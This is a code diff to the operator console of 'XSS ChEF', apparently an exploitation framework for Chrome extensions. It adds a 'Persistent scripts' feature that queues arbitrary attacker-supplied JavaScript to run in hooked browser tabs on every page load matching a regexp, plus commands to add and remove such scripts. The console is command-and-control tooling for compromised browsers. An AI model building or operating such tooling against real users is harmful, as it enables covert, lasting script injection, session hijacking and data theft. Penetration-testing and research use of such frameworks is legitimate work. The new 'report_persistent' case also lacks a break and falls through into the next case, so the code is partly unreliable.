@@ -22,6 +22,13 @@
 <title>XSS ChEF console</title>
 <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css"/>
 <style>
+h5 {
+margin-top: 1em;
+margin-bottom: 0.5em;
+}
+input {
+padding: 0;
+}
 body {
 padding-top: 50px;
 }
@@ -90,11 +97,36 @@ display:none;
                 <ul class="nav nav-tabs">
                     <li><button title="Choose hooked session" id=choose-hook class='btn btn-secondary'><i class="icon-list"></i></button>&nbsp;&nbsp;</li>
                     <li class="active"><a href="#tab-tabs" class='active' data-toggle="tab">Tabs</a></li>
+                    <li><a href="#tab-persistent-scripts" data-toggle="tab">Persistent scripts</a></li>
                     <li><a href="#tab-ext-info" data-toggle="tab">Hooked extension info</a></li>
                     <li><a href="#tab-ext-commands" data-toggle="tab">Extension commands</a></li>
                     <li> <button id=refresh-hook title="Refresh this hook" class='btn btn-secondary'><i class="icon-refresh"></i></button> </li>
                 </ul>
                 <div class="tab-content">
+                    <div class="tab-pane" id="tab-persistent-scripts">
+                        <p>Persistent scripts are scripts that are run on hooked browser tabs
+                           on every page load if the URL matches given regexp.
+                        </p>
+                        <h5>Active scripts</h5>
+                        <ul id="persistent-script-list">
+                        <li style=display:none id=persistent-script-template><span data-fld=name></span> - <code data-fld=urlmatch>http://*</code> <a href="#" data="" data-fld="name" data-attr="data" class="remove-persistent-script btn btn-secondary"><i class="icon-remove"></i></a></li>
+                        </ul>
+                        <h5>Add persistent script</h5>
+                        <form id=add-persistent-script action="#">
+                        <label>Name</label>
+                        <input name="name" placeholder="anything you like" />
+                        <label>When tab URL matches</label>
+                        <input name="urlmatch" placeholder="^http:" /><span class="help-inline">JS RegExp style</span>
+                        <label>Launch this code:</label>
+                        <select id="persistent-snippets">
+                            <option value="">Choose code snippet...</option>
+                        </select><br />
+                        <textarea name=code class="span12" style="height: 150px" placeholder="alert(/onload/)"></textarea>
+                        <label class=checkbox>
+                            <input type=checkbox name=run_now value=1 />Run now for existing tabs </label>
+                        <p><button class="btn btn-secondary">Add script</button></p>
+                        </form>
+                    </div>
                     <div class="tab-pane active" id="tab-tabs">
                         <div class="row">
                             <div class="span5" id="tabs-container">
@@ -233,7 +265,7 @@ display:none;
                         <div class=control-group>
 
             <h5>Create new tab <i title="Effect will be visible in hooked browser" class="icon-exclamation-sign"></i></h5>
-            <input id="tab-create-url" style="padding:0" placeholder="http://example.com/enter-to-open" />
+            <input id="tab-create-url" placeholder="http://example.com/enter-to-open" />
                             <form action="#">
                                 <h5>Eval</h5>
                                 <select id="eval-ext-snippets">
@@ -476,7 +508,7 @@ function fillDataTemplate(node, data) {
                 if (this.attributes['data-attr'].value == 'background') { // change background
                     $(this).css('background-image', 'url("' + text + '")');
                 } else {
-                    this[this.attributes['data-attr'].value] = text;
+                    $(this).attr(this.attributes['data-attr'].value, text);
                 }
             } else {
                 if ($(this).is(':input')) {
@@ -504,6 +536,18 @@ function refreshTabsTable(t) {
     if (currentTab) {
         $('tr[data-tabid=' + parseInt(currentTab,10) + ']').click(); // reselect current tab
     }
+}
+
+function refreshPersistentScriptList(scripts) {
+    var clone = $('#persistent-script-template').clone();
+    $("#persistent-script-list").html('');
+    for (var i = 0; i < scripts.length;  i++) {
+        var c = $(clone).clone();
+        c.attr('id', '');
+        fillDataTemplate(c,scripts[i]);
+        c.appendTo('#persistent-script-list').show();
+    }
+    clone.appendTo('#persistent-script-list');
 }
 
 function loadTabData(id) {
@@ -572,6 +616,10 @@ function processResponse(r, hook) {
             refreshTabsTable(hookStorage.getTabs(hook));
             al('New tab list received');
         break;
+        case 'report_persistent':
+            hookStorage.store(hook, 'persistent', r.result);
+            refreshPersistentScriptList(r.result);
+            al('New persistent scripts list received');
         case 'report_ext':
             hookStorage.store(hook, 'info', r.result);
             fillDataTemplate($('#tab-ext-info'), r.result);
@@ -691,12 +739,19 @@ d.body.appendChild(s);\n\
     
     $("#refresh-hook").click(function() {
         refreshTabsTable([]);
+        refreshPersistentScriptList([]);
+        fillDataTemplate($('#tab-ext-info'), {});
         sendCmd('report');
     });
     
     $(document).on('click', '#links a', function() {
         var cmd = "location.href = " + JSON.stringify(this.href);
         sendCmd('eval', cmd, {id: currentTab});
+        return false;
+    });
+
+    $(document).on('click', '.remove-persistent-script', function() {
+        sendCmd('removepersistent', $(this).attr('data'));
         return false;
     });
 
@@ -744,7 +799,24 @@ d.body.appendChild(s);\n\
         }
         
         return false;
-    })
+    });
+    
+    $("#add-persistent-script").submit(function() {
+        if (!hook) {
+            al('No current hook!');
+            return false;
+        }
+        var params = {};
+        $.each($(this).serializeArray(), function(index,value) {
+            params[value.name] = $.trim(value.value);
+        });
+        if (params.name == "" || params.urlmatch == "" || params.code == "") {
+            al('You need to enter name, URL match and code!');
+            return false;
+        }
+        sendCmd('addpersistent', params);
+        return false;
+    });
     
     $("#fix-server").click(function() {
         if (ws) {
@@ -794,8 +866,9 @@ d.body.appendChild(s);\n\
 
     // start with saved data
     refreshTabsTable(hookStorage.getTabs(hook));
-    al("Refreshed state from local storage");
+    refreshPersistentScriptList(hookStorage.retrieve(hook, 'persistent', []));
     fillDataTemplate($('#tab-ext-info'), hookStorage.retrieve(hook, 'info', {}));
+    al("Refreshed state from local storage");    
     $.get('README.md', function(t) { $('#readme').text(t) });
 });
 </script>
